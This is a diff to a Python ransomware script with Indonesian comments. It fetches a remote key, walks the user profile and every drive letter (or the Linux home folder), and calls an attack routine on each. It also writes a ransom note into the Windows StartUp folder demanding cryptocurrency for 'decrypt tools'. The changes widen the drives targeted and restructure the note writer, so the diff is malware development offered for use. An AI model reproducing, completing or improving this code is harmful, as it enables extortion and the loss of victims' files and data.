@@ -1,6 +1,6 @@
 import os
 import random
-import base64
+import hashlib
 import requests as req
 from time import sleep
 from sys import platform
@@ -15,8 +15,7 @@ key_c = random.choice(url_list)
 ext = '.' + key_c.split('.')[1]
 URL_KEY = url_web + key_c
 pbk = req.get(URL_KEY).text
-lcy = base64.b64encode(key_c.split('.pem')[0].encode('utf-8'))
-lcx = lcy.decode('utf-8')
+lcx = hashlib.sha1(key_c.split('.')[0].encode('utf-8')).hexdigest()+'.'+key_c.split('.')[1]
 
 WALLET_ADDRESS = '''
 BTC_ADDRESS  : 
@@ -25,7 +24,7 @@ BUSD_ADDRESS :
 '''
 CONTACT = '''YOUR CONTACT'''
 
-def splacer():
+def sp():
     if(platform == 'win32'):
         return '\\'
     elif(platform == 'linux'):
@@ -62,40 +61,41 @@ def attack(target):
                 except:
                     continue
 
-            # Tinggalkan pesan pada lines dibawah ini
-            try:
-                lines = '''        !ATTENTION!
-                Don't worry, you can return all your files!
-                All your files like photos, database, documents,
-                and other important are encrypted with strongest encryption and unique key.
-                I want to continue my studies, But need some money,
-                If you want to back your file, you can buy my decrypt tools
-                Price of decrypt tools is $10 - $1000 depend on large files''' + '''
-
-                Choice one payment\n'''+ WALLET_ADDRESS + '''
-                
-                Your Personal Key is : ''' + lcx + '''
-
-                ''' + CONTACT + '''
-                Thank You For Your Attention (*v*)'''
-
-                with open(p + splacer() + '_readme.txt', 'w') as f:
-                    f.writelines(lines)
-                with open(p + splacer() +'.license','w') as l:
-                    l.write(lcx)
-            except PermissionError:
-                problem = "Tidak bisa di isi file"
+def jejak(path):
+    # Tinggalkan pesan pada lines dibawah ini
+    try:
+        lines = '''        !ATTENTION!
+        Don't worry, you can return all your files!
+        All your files like photos, database, documents,
+        and other important are encrypted with strongest encryption and unique key.
+        I want to continue my studies, But need some money,
+        If you want to back your file, you can buy my decrypt tools
+        Price of decrypt tools is $10 - $1000 depend on large files''' + '''
+        Choice one payment\n'''+ WALLET_ADDRESS + '''
+        
+        Your Personal Key is : ''' + lcx + '''
+        ''' + CONTACT + '''
+        Thank You For Your Attention (*v*)'''
+        with open(path + sp() + '_readme.txt', 'w') as f:
+            f.writelines(lines)
+        with open(path + sp() +'.license','w') as l:
+            l.write(lcx)
+    except PermissionError:
+        problem = "Tidak bisa di isi file"
 
 if __name__ == '__main__':
     if (platform == 'win32'):
-        t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:"]
+        t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:","M:","O:","P:","Q:","R:","S:","T:","U:","V:","W:","X:","Y:","Z:"]
+        jlog = [os.environ["PROGRAMDATA"]+sp()+'Microsoft'+sp()+'Windows'+sp()+'Start Menu'+sp()+'Programs'+sp()+'StartUp']
+        jejak(jlog)
         for i in range(len(t)):
-            attack(t[i] + splacer())
+            attack(t[i] + sp())
             sleep(1800)
     elif (platform == 'linux'):
-        t = ['~']
+        t = [os.environ["HOME"]]
+        jejak(t + sp())
         for i in range(len(t)):
-            attack(t[i] + splacer())
+            attack(t[i] + sp())
             sleep(1800)
     else:
         print('I will better')
